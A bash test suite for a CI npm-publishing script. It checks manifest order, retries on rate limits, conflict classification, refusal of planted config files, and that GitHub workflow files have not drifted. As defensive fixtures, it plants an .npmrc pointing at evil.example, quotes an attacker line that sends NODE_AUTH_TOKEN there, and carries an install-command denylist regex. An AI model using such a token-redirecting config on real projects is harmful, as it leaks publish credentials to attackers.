#!/usr/bin/env bash
# Exercises tools/ci/publish-packed-tarballs.sh against a stub `npm`, with no registry and no
# token. That script is the only step in the release pipeline that holds a publish credential,
# and it runs for real perhaps once a release — far too rare a feedback loop to find a
# regression in. Its reject cases matter as much as its accept case: publishing in the wrong
# ORDER, or publishing a tarball nobody declared, are both green-looking failures at the one
# point in the pipeline that cannot be undone (`npm publish` has no re-push).
set -uo pipefail

SCRIPT="${1:-$(cd "$(dirname "$0")" && pwd)/publish-packed-tarballs.sh}"
[ -x "$SCRIPT" ] || { echo "FAIL: $SCRIPT is not executable"; exit 1; }

PASS=0
FAIL=0

check() { # name expected actual
    if [ "$2" = "$3" ]; then
        PASS=$((PASS + 1)); echo "ok   — $1"
    else
        FAIL=$((FAIL + 1)); echo "FAIL — $1 (expected '$2', got '$3')"
    fi
}

STUB_DIR="$(mktemp -d)"
WORK_ROOT="$(mktemp -d)"
trap 'rm -rf "$STUB_DIR" "$WORK_ROOT"' EXIT
mkdir -p "$STUB_DIR/bin"

# `npm prefix` walks up for a package.json or a node_modules exactly as npm's own localPrefix
# resolution does, so the guard in the script under test is exercised for real rather than
# against a stub that always agrees with it. `npm publish` appends its argv to PUBLISH_LOG,
# which is what the order assertions read.
cat > "$STUB_DIR/bin/npm" <<'STUB'
#!/usr/bin/env bash
case "$1" in
    prefix)
        dir="$PWD"
        while [ "$dir" != "/" ]; do
            if [ -e "$dir/package.json" ] || [ -e "$dir/node_modules" ]; then
                echo "$dir"; exit 0
            fi
            dir="$(dirname "$dir")"
        done
        echo "$PWD"
        ;;
    publish)
        shift
        echo "$*" >> "$PUBLISH_LOG"
        if [ -n "${FAKE_PUBLISH_FAILS:-}" ]; then
            echo 'stub-npm: publish failed' >&2; exit 1
        fi
        # One line of FAKE_PUBLISH_SEQUENCE per ATTEMPT, not per package — which is what makes
        # the retry cases expressible at all. The line number is the attempt number because
        # every attempt appends exactly one line to PUBLISH_LOG above. Beyond the last line the
        # sed prints nothing and the attempt succeeds, so a sequence only has to spell out its
        # interesting prefix.
        # `npm publish` lists the tarball's contents before it attempts the PUT, one
        # `npm notice <size> <path>` per file. FAKE_TARBALL_CONTENTS plants paths in that
        # listing, which is how the classifier's input can be steered by package content.
        if [ -n "${FAKE_TARBALL_CONTENTS:-}" ]; then
            echo 'npm notice Tarball Contents'
            printf '%s\n' "$FAKE_TARBALL_CONTENTS" | while IFS= read -r entry; do
                [ -n "$entry" ] && echo "npm notice 2B ${entry}"
            done
        fi
        if [ -n "${FAKE_PUBLISH_SEQUENCE:-}" ]; then
            attempt="$(grep -c . < "$PUBLISH_LOG")"
            case "$(printf '%s\n' "$FAKE_PUBLISH_SEQUENCE" | sed -n "${attempt}p")" in
                429)
                    # npm's real wording, so the script's classifier is exercised against the
                    # text it will actually be handed rather than against a token invented here.
                    echo 'npm error code E429' >&2
                    echo 'npm error 429 Too Many Requests - PUT https://registry.npmjs.org/@aiqadam%2fqadam-baserow - Could not publish, as user undefined: rate limited exceeded' >&2
                    exit 1
                    ;;
                5xx)
                    # The other retryable class, and the only one after which a conflict can be
                    # our own earlier PUT: the request may have been processed and only the
                    # answer lost.
                    echo 'npm error code E503' >&2
                    echo 'npm error 503 Service Unavailable - PUT https://registry.npmjs.org/@aiqadam%2fshared' >&2
                    exit 1
                    ;;
                conflict)
                    echo 'npm error code EPUBLISHCONFLICT' >&2
                    echo 'npm error Cannot publish over previously published version 0.1.0.' >&2
                    exit 1
                    ;;
                fatal)
                    echo 'npm error code E403' >&2
                    echo 'npm error 403 Forbidden - PUT https://registry.npmjs.org/@aiqadam%2fqadam-x' >&2
                    exit 1
                    ;;
            esac
        fi
        ;;
    *)
        echo "stub-npm: unexpected command: $*" >&2; exit 1
        ;;
esac
STUB
chmod +x "$STUB_DIR/bin/npm"
export PATH="$STUB_DIR/bin:$PATH"

# The retry backoff is real `sleep`, so the suite would otherwise spend 15 minutes asleep proving
# a case about arithmetic. Zeroed here rather than per case: a case that forgets to zero it is
# not wrong, just slow, and slow is how a suite stops being run. The two cases that assert on
# pacing set their own value.
export NPM_PUBLISH_RETRY_BASE_SECONDS=0
export NPM_PUBLISH_THROTTLE_ON_LIMIT_SECONDS=0

# A fresh tarball directory with the given manifest lines, each also created as a real file
# unless the name is prefixed with `!` (declared-but-absent).
new_case() { # case-name manifest-line...
    local dir="$WORK_ROOT/$1"
    shift
    mkdir -p "$dir"
    : > "$dir/publish-order.txt"
    local line
    for line in "$@"; do
        if [ "${line#!}" != "$line" ]; then
            echo "${line#!}" >> "$dir/publish-order.txt"
        else
            echo "$line" >> "$dir/publish-order.txt"
            echo 'tarball' > "$dir/$line"
        fi
    done
    echo "$dir"
}

run_case() { # dir
    PUBLISH_LOG="$WORK_ROOT/publish.log"
    export PUBLISH_LOG
    : > "$PUBLISH_LOG"
    "$SCRIPT" "$1" > "$WORK_ROOT/out.log" 2>&1
}

# --- the accept case, and the property the split put at risk -------------------------------
dir="$(new_case happy aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz aiqadam-qadams-common-0.14.1.tgz)"
run_case "$dir"
check "publishes three tarballs successfully" 0 $?
check "publishes in manifest order, not alphabetical" \
    "shared framework common" \
    "$(sed -E 's#^\./aiqadam-(qadams-)?([a-z]+)-[0-9].*#\2#' "$WORK_ROOT/publish.log" | tr '\n' ' ' | sed 's/ $//')"
check "passes the flags provenance needs" \
    "3" \
    "$(grep -c -- '--access public --tag latest --provenance' "$WORK_ROOT/publish.log")"

# Alphabetical order would be common, framework, shared — assert the fixture could actually
# have caught that, so the assertion above is not vacuous.
check "the fixture's alphabetical order really does differ from its manifest order" \
    "aiqadam-qadams-common-0.14.1.tgz" \
    "$(cd "$dir" && ls ./*.tgz | head -1 | xargs basename)"

# --- empty is success, absent is not -------------------------------------------------------
dir="$(new_case empty)"
run_case "$dir"
check "an empty manifest is a green no-op" 0 $?
check "and publishes nothing" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

dir="$(new_case missing-manifest aiqadam-shared-0.135.0.tgz)"
rm "$dir/publish-order.txt"
run_case "$dir"
check "a missing manifest fails rather than publishing nothing quietly" 1 $?

# --- the reject cases ----------------------------------------------------------------------
dir="$(new_case declared-absent '!aiqadam-shared-0.135.0.tgz')"
run_case "$dir"
check "a manifest entry with no file fails" 1 $?

dir="$(new_case undeclared-present aiqadam-shared-0.135.0.tgz)"
echo 'tarball' > "$dir/aiqadam-smuggled-9.9.9.tgz"
run_case "$dir"
check "a tarball the manifest does not name fails" 1 $?
check "and nothing was published before the refusal" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

# The target is created deliberately: with it absent the existence check refuses the entry
# first, and this case passes with the separator guard deleted — verified by mutation, which is
# how it was caught. Only a resolvable path leaves the guard as the sole thing that can refuse.
dir="$(new_case traversal '!../outside.tgz')"
echo 'tarball' > "$WORK_ROOT/outside.tgz"
run_case "$dir"
check "a manifest entry containing a path separator fails" 1 $?
check "and nothing was published before that refusal" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

# npm falls back to the cwd for localPrefix when the walk up finds nothing, so a config file
# planted in the tarball directory ITSELF is read as project config while `npm prefix` still
# answers that directory and the prefix guard passes. app-sec demonstrated the consequence: an
# .npmrc carrying `//evil.example/:_authToken=${NODE_AUTH_TOKEN}` sends the token to the
# attacker's registry, with every guard green. The directory sweep is what closes it, so these
# two cases are the ones that must fail if the sweep is ever narrowed back to `*.tgz`.
dir="$(new_case planted-npmrc aiqadam-shared-0.135.0.tgz)"
printf 'registry=https://evil.example/\n' > "$dir/.npmrc"
run_case "$dir"
check "an .npmrc planted in the tarball directory fails" 1 $?
check "and the token never reaches a publish" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

# A pack run that used --skip-registry-check drops this marker (see SKIP_REGISTRY_CHECK_MARKER in
# tools/scripts/utils/publish-npm-package.ts). Those tarballs were built with the already-published
# and version-bump guards disabled and must never reach the registry. Nothing here knows the name:
# the undeclared-entry sweep refuses it because the manifest does not name it, which is precisely
# the coupling this case exists to pin — narrow that sweep and this goes red.
dir="$(new_case skip-registry-check-marker aiqadam-shared-0.135.0.tgz)"
printf 'packed with the guards off\n' > "$dir/PACKED-WITH-SKIP-REGISTRY-CHECK"
run_case "$dir"
check "a directory marked as packed with --skip-registry-check is refused" 1 $?
check "and nothing from it is published" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

dir="$(new_case planted-package-json aiqadam-shared-0.135.0.tgz)"
echo '{"name":"smuggled"}' > "$dir/package.json"
run_case "$dir"
check "a package.json planted in the tarball directory fails" 1 $?

dir="$(new_case project-config aiqadam-shared-0.135.0.tgz)"
# The package.json goes in a parent of its OWN case directory, never in $WORK_ROOT: one placed
# there would sit above every later case too, and each would fail this guard before reaching a
# publish — silently turning the rest of the suite into assertions about the wrong refusal.
mkdir -p "$WORK_ROOT/project-config-parent/tarballs"
echo '{"name":"repo"}' > "$WORK_ROOT/project-config-parent/package.json"
cp "$dir/publish-order.txt" "$WORK_ROOT/project-config-parent/tarballs/"
cp "$dir/aiqadam-shared-0.135.0.tgz" "$WORK_ROOT/project-config-parent/tarballs/"
run_case "$WORK_ROOT/project-config-parent/tarballs"
check "a package.json above the tarballs fails — project .npmrc would outrank the auth config" 1 $?

# --- a failed publish must stop, not continue down the manifest ----------------------------
dir="$(new_case publish-fails aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz)"
FAKE_PUBLISH_FAILS=1 run_case "$dir"
check "a failing publish exits non-zero" 1 $?
check "and does not continue to the next package" "1" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

# --- rate limiting: the failure that actually happened -------------------------------------
# #476's first real run died 23 packages into a 239-entry manifest on `429 Too Many Requests`,
# with 216 left and no way to resume but another approved dispatch. These cases pin the two
# halves of the answer — retry the package, then pace the rest of the manifest — and, just as
# importantly, pin that neither of them fires for a failure retrying cannot fix.
dir="$(new_case rate-limited-then-ok aiqadam-shared-0.135.0.tgz)"
FAKE_PUBLISH_SEQUENCE='429' run_case "$dir"
check "a rate-limited publish is retried rather than failing the run" 0 $?
check "and the retry is a second attempt at the same package" "2" "$(grep -c . < "$WORK_ROOT/publish.log")"

dir="$(new_case rate-limited-forever aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz)"
FAKE_PUBLISH_SEQUENCE=$'429\n429\n429\n429\n429' NPM_PUBLISH_MAX_ATTEMPTS=3 run_case "$dir"
check "a registry that keeps refusing eventually fails the run" 1 $?
check "after exactly NPM_PUBLISH_MAX_ATTEMPTS attempts" "3" "$(grep -c . < "$WORK_ROOT/publish.log")"
check "and it says how to resume, since the pack step skips what is already published" "yes" \
    "$(grep -qF 'Re-dispatch to resume' "$WORK_ROOT/out.log" && echo yes || echo no)"

# The counterpart to the retry, and the reason it is not enough on its own: retrying gets THIS
# package published, pacing is what stops the next two hundred hitting the same wall.
#
# Asserted as elapsed WALL CLOCK, not as the log line announcing the pace. The log line was the
# first spelling and it is not an assertion about pacing at all: mutating the loop to sleep
# before every package regardless left it green, because the announcement and the sleep are
# different statements. Timing is coarse — `SECONDS` is integer and CI runners are noisy — so
# the two bounds are set far apart (a 2s pace over a 2-entry manifest against a <3s ceiling for
# the unpaced run) rather than tightly around the expected value.
dir="$(new_case throttle-engages aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz)"
started=$SECONDS
FAKE_PUBLISH_SEQUENCE='429' NPM_PUBLISH_THROTTLE_ON_LIMIT_SECONDS=2 run_case "$dir"
status=$?
elapsed=$((SECONDS - started))
check "a rate limit paces the rest of the manifest" 0 "$status"
check "and the next publish really waits for that pace" "waited" \
    "$([ "$elapsed" -ge 2 ] && echo waited || echo "did not wait: ${elapsed}s")"
check "and says the pace it settled on" "yes" \
    "$(grep -qF 'pacing the rest of the manifest at 2s' "$WORK_ROOT/out.log" && echo yes || echo no)"

# Pacing a run that was never rate-limited would slow every ordinary release for nothing. With
# the default starting pace of zero this is what holds the ordinary path at the speed it had
# before the loop grew a throttle at all.
dir="$(new_case no-throttle-without-a-limit aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz aiqadam-qadams-common-0.14.1.tgz)"
started=$SECONDS
run_case "$dir"
elapsed=$((SECONDS - started))
check "a run that is never rate-limited is never paced" "fast" \
    "$([ "$elapsed" -lt 3 ] && echo fast || echo "paced anyway: ${elapsed}s")"
check "and it never claims to have paced itself" "no" \
    "$(grep -qF 'pacing the rest of the manifest' "$WORK_ROOT/out.log" && echo yes || echo no)"

# `npm publish` is a PUT, so a retry can meet the registry holding what the lost attempt wrote.
# Without this the retry above would turn a successful publish into a failed run — which is why
# it is a case and not a footnote. Note what makes it the lost-response case: the earlier attempt
# ended WITHOUT AN ANSWER (a 5xx), not merely earlier.
dir="$(new_case conflict-after-lost-response aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz)"
FAKE_PUBLISH_SEQUENCE=$'5xx\nconflict' run_case "$dir"
check "a version conflict after an unanswered attempt is the lost-response case, not a failure" 0 $?
check "and the manifest still finishes" "3" "$(grep -c . < "$WORK_ROOT/publish.log")"

# ...and a 429 is NOT that. The registry declining to process the PUT means nothing of ours was
# written, so a conflict on the retry was put there by something else — and the first spelling of
# this loop took `attempt > 1` as proof of a lost response and accepted it silently. Publishing
# under the official scope from outside this pipeline is the single thing #482 exists to notice,
# so it ends the run red even though it arrives on a retry.
dir="$(new_case conflict-after-rate-limit aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz)"
FAKE_PUBLISH_SEQUENCE=$'429\nconflict' run_case "$dir"
check "a version conflict after a 429 is NOT counted as our own lost publish" 1 $?
check "and the run names which package it was" "yes" \
    "$(grep -qF '::error::  aiqadam-shared-0.135.0.tgz' "$WORK_ROOT/out.log" && echo yes || echo no)"
check "and the rest of the manifest is still published" "3" "$(grep -c . < "$WORK_ROOT/publish.log")"

# The lost-response flag is about ONE name@version, so it has to be cleared between packages.
# Here the first package survives an unanswered attempt and then publishes; the second conflicts
# on its own first attempt and must still be refused. A flag hoisted out of the per-package loop
# would carry the first package's excuse onto the second.
dir="$(new_case lost-response-does-not-carry-over aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz)"
FAKE_PUBLISH_SEQUENCE=$'5xx\n\nconflict' run_case "$dir"
check "one package's lost response does not excuse the next package's conflict" 1 $?
check "and it is the second package the run names" "yes" \
    "$(grep -qF '::error::  aiqadam-qadams-framework-0.32.1.tgz' "$WORK_ROOT/out.log" && echo yes || echo no)"

# The same registry answer on the FIRST attempt means the same thing: nothing in this job
# published it, and the pack step refuses to pack a version the registry already has. The
# rest of the manifest is still the deliverable — no outcome here can change bytes already
# published — but the run must not end green on it.
dir="$(new_case conflict-on-first-attempt aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz)"
FAKE_PUBLISH_SEQUENCE='conflict' run_case "$dir"
check "a version already on the registry at the first attempt fails the run" 1 $?
check "but the rest of the manifest is still published" "2" "$(grep -c . < "$WORK_ROOT/publish.log")"
# Anchored on the summary's own `::error::  ` prefix, not on the bare file name: the run logs
# `publishing aiqadam-shared-0.135.0.tgz` on the way in, so a plain grep for the name passes
# whether or not the summary exists at all.
check "and the run names which package it was" "yes" \
    "$(grep -qF '::error::  aiqadam-shared-0.135.0.tgz' "$WORK_ROOT/out.log" && echo yes || echo no)"

# Retrying a bad token, a forbidden scope or a malformed tarball buys nothing and costs the
# backoff on every one of 239 entries. Only the transient classes are retried.
dir="$(new_case fatal-not-retried aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz)"
FAKE_PUBLISH_SEQUENCE='fatal' run_case "$dir"
check "a 403 is not retried" 1 $?
check "and stops the manifest at the first attempt" "1" "$(grep -c . < "$WORK_ROOT/publish.log")"

# The classifier reads npm's output, and `npm publish` prints the tarball's CONTENTS into that
# output before it attempts the PUT — so without a restriction to npm's own error lines, a file
# path inside a published package chooses the classification. app-sec demonstrated the whole
# chain: a doc named `Cannot publish over.md`, a 429 on the first attempt and a real 403 on the
# second, and the 403 was counted as the retry's own lost response. Exit 0, "published 1
# package(s)", nothing published. This is the only case in the suite where the interesting input
# is package CONTENT rather than the manifest, which is exactly why it was missed.
dir="$(new_case notice-lines-cannot-steer-the-classifier aiqadam-shared-0.135.0.tgz)"
FAKE_TARBALL_CONTENTS=$'docs/Cannot publish over.md\nsrc/E429.ts' \
  FAKE_PUBLISH_SEQUENCE=$'429\nfatal' run_case "$dir"
check "a tarball path that looks like an npm error cannot make a 403 look like a conflict" 1 $?
check "and the run does not claim to have published it" "no" \
    "$(grep -qF 'published 1 package(s)' "$WORK_ROOT/out.log" && echo yes || echo no)"

# The same planted paths must not fake a RATE LIMIT either, which would burn every backoff on a
# failure that is never going to clear.
dir="$(new_case notice-lines-cannot-fake-a-rate-limit aiqadam-shared-0.135.0.tgz)"
FAKE_TARBALL_CONTENTS='src/E429.ts' FAKE_PUBLISH_SEQUENCE='fatal' run_case "$dir"
check "a tarball path naming E429 does not turn a 403 into a retry" 1 $?
check "and the publish is attempted exactly once" "1" "$(grep -c . < "$WORK_ROOT/publish.log")"

# --- the dist-tag is honoured --------------------------------------------------------------
dir="$(new_case dist-tag aiqadam-shared-0.135.0.tgz)"
NPM_DIST_TAG=next run_case "$dir"
check "NPM_DIST_TAG is honoured" "1" "$(grep -c -- '--tag next' "$WORK_ROOT/publish.log")"

# The manifest filename exists as a literal in both a TypeScript producer and a shell consumer,
# which cannot import from each other. Nothing else would notice them drifting apart.
REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
ts_name="$(sed -n "s/^const PUBLISH_ORDER_FILENAME = '\\(.*\\)'.*/\\1/p" "$REPO_ROOT/tools/scripts/publish-framework-packages.ts")"
ts_marker="$(sed -n "s/^const SKIP_REGISTRY_CHECK_MARKER = '\\(.*\\)'.*/\\1/p" "$REPO_ROOT/tools/scripts/utils/publish-npm-package.ts")"
check "the marker fixture above uses the name the producer actually writes" "PACKED-WITH-SKIP-REGISTRY-CHECK" "$ts_marker"

# The marker only reaches the publishing job because the packing job uploads the pack
# directory whole. An enumerated `path:` would drop it and silently undo the protection above,
# with this suite still green — so the shape of that one line is pinned here rather than left
# to a comment. Anchored on the step name, not on `name: npm-framework-packages`, which the
# DOWNLOAD step carries too — the looser range swept in a third, unrelated `path:` and the
# check failed on its own extraction rather than on the property.
#
# The file has moved twice: out of release.yml in #496, then again in #498 when the PUBLISHING
# job went back into each caller and only packing stayed reusable. Pinning the wrong file would
# pin one with no upload step in it — and `sed` over a file with no match prints nothing, which
# is the failure mode this suite's own docs warn about. The existence check and the
# exactly-one-line check below are what turn that into a red test rather than a vacuous pass.
WORKFLOW="$REPO_ROOT/.github/workflows/_pack-framework-packages.yml"
[ -f "$WORKFLOW" ] || { echo "FAIL: $WORKFLOW does not exist"; exit 1; }
upload_block="$(sed -n '/- name: Upload the packed tarballs/,/retention-days/p' "$WORKFLOW")"
upload_path="$(printf '%s\n' "$upload_block" | sed -n 's/^ *path: //p')"
upload_path_count="$(printf '%s\n' "$upload_path" | grep -c . || true)"
check "exactly one path: line was read out of the upload step" "1" "$upload_path_count"
check "the packing job uploads the pack directory whole, so the marker is in the artifact" \
    "\${{ runner.temp }}/npm-packages" "$upload_path"
case "$ts_marker" in
  .*) check "the marker is not a dotfile (upload-artifact drops those)" "not-a-dotfile" "dotfile" ;;
  *)  check "the marker is not a dotfile (upload-artifact drops those)" "not-a-dotfile" "not-a-dotfile" ;;
esac
sh_name="$(sed -n 's/^PUBLISH_ORDER_FILENAME="\(.*\)"$/\1/p' "$REPO_ROOT/tools/ci/publish-packed-tarballs.sh")"
check "the producer and the consumer agree on the manifest filename" "$ts_name" "$sh_name"
check "and that name is not empty (so the check above is not vacuous)" "publish-order.txt" "$ts_name"

# The publishing job is duplicated in release.yml and publish-packages.yml on purpose (#498):
# `environment:` only resolves its secrets in a job that lives in the workflow the event
# triggered, so it cannot move into the reusable packing workflow, and passing the token down
# instead would force it to repository scope where every workflow can read it. Duplication
# chosen deliberately still drifts, and the half that drifts silently is the one nobody runs
# until a release — so the two copies are pinned equal here, comments excluded because each
# carries its own lead paragraph.
# Both halves of the terminator were found by review, each by executing an attack rather than
# by reading:
#
#   /^[^[:space:]]/      a COLUMN-0 key. Without it nothing stopped the scan at a top-level
#                        block, so appending one after the last job in publish-packages.yml
#                        (where this job is last and awk otherwise runs to EOF) made the two
#                        extractions differ while the jobs were identical — a failure on the
#                        wrong property, the same self-inflicted class the upload-path check
#                        above already suffered once.
#   /^  [^[:space:]#]/   the next JOB key, and deliberately not a two-space COMMENT. With a
#                        bare `[^ ]` the scan stopped at the first such comment inside the job
#                        body: one comment line added to both files, plus an exfiltrating
#                        `run:` below it in both, and every assertion here stayed green.
#
# The trailing greps drop comments and blanks, so over-capturing the comment block that
# precedes the next job key costs nothing.
extract_publish_job() {
    awk '
        /^  publish-framework-packages:$/                  { inside = 1; print; next }
        inside && (/^[^[:space:]]/ || /^  [^[:space:]#]/)  { inside = 0 }
        inside                                             { print }
    ' "$1" | grep -vE '^[[:space:]]*#' | grep -vE '^[[:space:]]*$'
}
release_job="$(extract_publish_job "$REPO_ROOT/.github/workflows/release.yml")"
dispatch_job="$(extract_publish_job "$REPO_ROOT/.github/workflows/publish-packages.yml")"
release_job_lines="$(printf '%s\n' "$release_job" | grep -c . || true)"
check "the publishing job was actually found in release.yml (guards a vacuous compare below)" \
    "yes" "$([ "$release_job_lines" -gt 20 ] && echo yes || echo "no: only $release_job_lines lines")"
if [ "$release_job" = "$dispatch_job" ]; then
    check "release.yml and publish-packages.yml carry the same publishing job" "identical" "identical"
else
    printf 'publishing job drift:\n%s\n' "$(diff <(printf '%s\n' "$release_job") <(printf '%s\n' "$dispatch_job") || true)"
    check "release.yml and publish-packages.yml carry the same publishing job" "identical" "they differ"
fi

# The loop below names its two files, so a THIRD copy of the publishing job would be pinned by
# nothing at all — and #498's deliberate duplication is exactly what makes a third one
# plausible: whoever needs a hotfix publish path will copy the job again. Demonstrated: a
# `hotfix-publish.yml` carrying the job plus a step curling the token out passed all 45
# assertions. This is the list, so adding a caller means adding it here too.
#
# Both extensions: Actions reads `.yaml` as well, and the first spelling of this guard globbed
# only `./*.yml`, so the same copy named `hotfix-publish.yaml` walked straight past the check
# added to catch it. It keys on the job NAME, so a renamed or quoted key still evades — that is
# the limit of a text grep and the reason the real control is the environment's policy.
check "the publishing job appears only in release.yml and publish-packages.yml" \
    "publish-packages.yml release.yml" \
    "$(cd "$REPO_ROOT/.github/workflows" \
        && grep -l '^  publish-framework-packages:' ./*.yml ./*.yaml 2>/dev/null \
        | sed 's#^\./##' | sort | tr '\n' ' ' | sed 's/ $//')"

# Equality alone is only a drift detector: an edit applied IDENTICALLY to both copies passes
# it. The properties below are the ones #486 bought, asserted positively on each copy so that
# symmetric damage is caught too. Review's phrasing, worth keeping: the difference between a
# drift detector and a control.
for wf in release.yml publish-packages.yml; do
    job="$(extract_publish_job "$REPO_ROOT/.github/workflows/$wf")"

    # The environment is what makes the secret resolve at all and what summons the required
    # reviewer. Deleting it is the single edit that would silently turn the publish into an
    # unreviewed one.
    check "$wf's publishing job still declares the npm-publish environment" "npm-publish" \
        "$(printf '%s\n' "$job" | sed -n 's/^    environment: //p')"

    # The anchor: without it, a copy whose final step was replaced in BOTH files still looks
    # identical and still has an environment.
    check "$wf's publishing job still runs the shared publisher script" "yes" \
        "$(printf '%s\n' "$job" | grep -qF 'tools/ci/publish-packed-tarballs.sh "${{ runner.temp }}/npm-packages"' && echo yes || echo no)"

    # `contains` alone would pass a token-reading step APPENDED after the publish, so the
    # publisher must also be the LAST step. Two spellings of that were tried and both were
    # wrong. `tail -1` pinned the job's last text line, so `run:` written before `env:` — an
    # equally common key order — reddened every PR in the repo (this suite gates _verify.yml,
    # which ci.yml, release.yml and publish-packages.yml all call). Counting
    # `^      - (name|uses):` headers after the publisher then missed every other first key a
    # step may carry: `- run:`, `- id:`, `- if:` and `- env:` all appended cleanly, and
    # anchoring the range on the FIRST mention of the script path meant merely naming that path
    # in the credential check's error text moved the anchor and reddened the suite.
    #
    # So: find the last step header and the last occurrence of the invocation, and require the
    # invocation to fall inside that final step. Any first key works, prose mentioning the path
    # earlier is harmless, and multi-line `run: |` bodies are fine.
    #
    # `last > 0` is the whole assertion, not a detail. Step headers are matched at a literal
    # six spaces, so re-indenting the `steps:` sequence to the zero-indent block style — legal
    # YAML, and what yamlfmt and prettier emit by default — leaves `last` at 0, and without
    # this clause `hit >= 0` would then be unconditionally true and the check silently
    # permanent-green. A reformat now reddens it loudly instead, which is the trade this file
    # already makes at the `path:` and job-found guards above.
    check "$wf's publishing job runs the shared publisher script as its last step" "yes" \
        "$(printf '%s\n' "$job" | awk -v needle='tools/ci/publish-packed-tarballs.sh "${{ runner.temp }}/npm-packages"' '
            /^      - /        { last = NR }
            index($0, needle)  { hit = NR }
            END                { print (hit > 0 && last > 0 && hit >= last) ? "yes" : "no" }
        ')"

    # The last-step check above still passes if the appended step's own body happens to repeat
    # the invocation — an exfiltrating `run:` with it in a trailing comment does, and so does an
    # ordinary job-summary step echoing the command it ran. Pinning the count closes that, and
    # every other appended-step shape, without caring about first keys or bodies at all.
    # Bumping this number when a step is legitimately added is the point: a new step in the one
    # job that holds the publish credential should cost a line of review.
    #
    # Counted from `steps:` rather than over the whole job, because `needs:` sits at the same
    # depth and rewriting it from flow to block style is a semantically identical reformat that
    # would otherwise read as a sixth step. The anchor is a prefix, not an exact match: a
    # trailing comment or a trailing space on the `steps:` line would otherwise read as zero.
    #
    # And it bounds how many steps there are, not what they do: editing the BODY of a step that
    # legitimately exists is invisible here, as it is to the other assertions. Pinning bodies is
    # a different and much heavier tool.
    check "$wf's publishing job has exactly the five expected steps" "5" \
        "$(printf '%s\n' "$job" | sed -n '/^    steps:/,$p' | grep -cE '^      - ' || true)"

    # #486: the job holding the token installs nothing and resolves no binary out of
    # node_modules/.bin. A build step appearing here is the regression that split bought.
    # Spell the package managers out as a matrix rather than listing the two or three
    # invocations that happen to be on the mind of whoever last edited this: an earlier
    # version named `bun install`, `npm ci` and `bunx` but not `npm install` or `bun x`, which
    # is the plainest spelling of the very property the assertion is named for. Anything
    # FLAG-SHAPED between the manager and the verb is allowed for, so `npm -g install` and
    # `npm --prefix /tmp install` are caught alongside the `npm install -g` that was once the
    # only spelling caught — but a gap of arbitrary words is not, because that made a step
    # renamed "Publish to npm and add the dist-tag" red. The one-letter verbs `i` and `x` stay
    # adjacent-only: nobody writes `npm --prefix /tmp i`, and a gap before a single letter
    # matches far too much prose. Every package-manager branch carries a left boundary — the
    # three literal alternatives do not need one — and it is `[^[:alnum:]_]` rather than
    # whitespace: whitespace alone dropped `bash -c "npm install evil"`, `cd /tmp;npm install`
    # and `echo $(npm install evil)`, which are ordinary shell, while still excluding the
    # alphanumeric predecessor that made `apt` match inside "ad*apt*".
    #
    # It stays a denylist, and a denylist is never complete — a piped `curl | sh`, or an
    # `npm \` continuation with the verb on the next line, are in reach of anyone who wants
    # them. It is a regression detector for the accident, not a barrier against the adversary;
    # the barrier is the environment's deployment-branch and reviewer policy. It scans the
    # job's whole text, so the words `no npm install here` in a step NAME or a `run:` body
    # redden it; a full-line YAML comment does not, because the extractor strips those.
    check "$wf's publishing job installs nothing and runs no npx" "clean" \
        "$(printf '%s\n' "$job" | grep -qE 'install-deps\.sh|node_modules/\.bin|corepack|(^|[^[:alnum:]_])(npm|pnpm|yarn|bun)[[:space:]]+(-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?[[:space:]]+)*(install|ci|add|exec|dlx)([[:space:]]|$)|(^|[^[:alnum:]_])(npm|pnpm|yarn|bun)[[:space:]]+(i|x)([[:space:]]|$)|(^|[^[:alnum:]_])yarn[[:space:]]*$|(^|[^[:alnum:]_])(npx|bunx|turbo)([[:space:]]|$)|(^|[^[:alnum:]_])(pipx|pip3?|gem|brew|apt(-get)?|apk)[[:space:]]+(-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?[[:space:]]+)*(install|add)([[:space:]]|$)' && echo "found an install or npx" || echo clean)"

    # A text scan over `run:` cannot see an install that arrives as a composite action, so the
    # set of actions is an allowlist rather than a denylist. A check that silently DROPS what
    # it is meant to catch is worse than no check, and this one managed that twice: first by
    # requiring `<name>@<ref>`, which skipped a version-less local action, then by requiring
    # `uses:` to be the dash key, which skipped the `- name:` / `uses:` form that 28 of this
    # repo's own steps are written in. So match `uses:` at any indent with or without the dash,
    # then strip quotes, trailing comments and the version separately — a routine
    # actions/checkout bump must not redden this, a fourth action must. Deliberately wide: a
    # `uses:` line inside a `with:` value or a heredoc is counted too and shows up as a loud,
    # diffable mismatch. Narrowing the pattern is what produced the two silent drops above.
    check "$wf's publishing job uses only the three expected actions" \
        "actions/checkout actions/download-artifact actions/setup-node" \
        "$(printf '%s\n' "$job" \
            | sed -nE 's/^[[:space:]]+(- )?uses:[[:space:]]+//p' \
            | sed -E 's/["'"'"']//g; s/[[:space:]]*#.*//; s/@.*//; s/[[:space:]]+$//' \
            | sort -u | tr '\n' ' ' | sed 's/ $//')"

    # A job holding an npm publish token has no business also holding a git one.
    check "$wf's publishing job checks out without git credentials" "yes" \
        "$(printf '%s\n' "$job" | grep -qF 'persist-credentials: false' && echo yes || echo no)"

    # --provenance cannot mint an attestation without it.
    check "$wf's publishing job still requests the OIDC token for --provenance" "yes" \
        "$(printf '%s\n' "$job" | grep -qE '^      id-token: write$' && echo yes || echo no)"
done

echo ""
